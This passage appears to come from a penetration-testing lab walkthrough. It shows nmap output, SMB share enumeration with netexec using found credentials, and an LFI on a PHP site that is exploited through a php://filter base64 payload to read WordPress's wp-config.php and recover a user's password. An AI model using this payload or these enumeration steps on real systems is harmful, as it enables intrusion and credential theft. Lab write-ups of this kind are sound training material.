SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-17T19:09:05
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: DANTE-WS03, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:68:9f (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 10 IP addresses (10 hosts up) scanned in 946.96 seconds
```

25. Since we have SMB ports open, let's first check if our user `james:Toyota` can enuemrate shares on any of these hosts

`nxc smb 172.16.1.0_alive_hosts.txt -u james -p Toyota --shares`

<img width="1264" height="530" alt="image" src="https://github.com/user-attachments/assets/bd099b6b-7f1d-4172-ad66-a5d0df7b1af7" />

26. We discover 2 shares, `SlackMigration` on NIX02 and `forensics` on NIX03. Let's see what's on `SlackMigration` first.

<img width="871" height="334" alt="image" src="https://github.com/user-attachments/assets/e0b57a8a-4a7e-4977-965d-eb7bd4f9bb24" />

27. The file `admintasks.txt` tells us about a wordpress install in the web root on 172.16.1.10. Combine this with the information about a LFI on another website from the `todo.txt` from the WEB-NIX01 FTP server, perhaps we can try exploiting the LFI on 172.16.1.10's web server to read sensitive files from Wordpress. 

<img width="1333" height="356" alt="image" src="https://github.com/user-attachments/assets/d862484e-0b57-4d1b-a6c8-de27face0d71" />

28. Indeed there is a LFI! However, since this is a PHP site, we won't be able to directly output the contents of any PHP Wordpress files. So we'll base64 encode it using PHP filters

`http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php`

29. Copy paste the base64 string and decode it

`echo [BASE64_STRING] | base64 -d > wp-config.php`

30. Reading the contents of the `wp-config.php` file gives us margaret's password `Welcome1!2@3#`



